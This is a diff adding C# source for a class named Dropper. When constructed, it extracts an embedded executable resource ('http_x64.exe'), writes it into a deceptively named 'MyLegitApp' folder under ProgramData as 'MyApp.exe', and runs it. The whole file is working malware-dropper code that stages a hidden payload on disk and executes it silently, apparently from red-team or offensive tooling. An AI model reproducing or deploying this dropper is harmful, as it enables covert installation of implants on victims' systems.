@@ -1,0 +1,44 @@
+// code for class Dropper.cs in project MyDropper
+
+using System.Reflection;
+  
+namespace MyDropper
+{
+    public class Dropper
+    {
+        public Dropper()
+        {
+            // use reflection to get reference to own assembly
+            var assembly = Assembly.GetExecutingAssembly();
+  
+            // read embedded payload
+            using (var rs = assembly.GetManifestResourceStream("MyDropper.http_x64.exe"))
+            {
+                // get path to ProgramData
+                var path = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
+                
+                // construct new path with our dir name
+                var newPath = Path.Combine(path, "MyLegitApp");
+                
+                // create new directory inside ProgramData
+                var newDir = Directory.CreateDirectory(newPath);
+              
+                // construct path for the executable
+                var filePath = Path.Combine(newDir.FullName, "MyApp.exe");
+                
+                // drop the path to disk
+                using (var fs = File.Create(filePath))
+                {
+                    // copy resource stream into file stream
+                    rs.CopyTo(fs);
+              
+                    // close file
+                    rs.Close();
+                }
+
+              // execute it
+              Process.Start(filePath);
+            }
+        }
+    }
+}
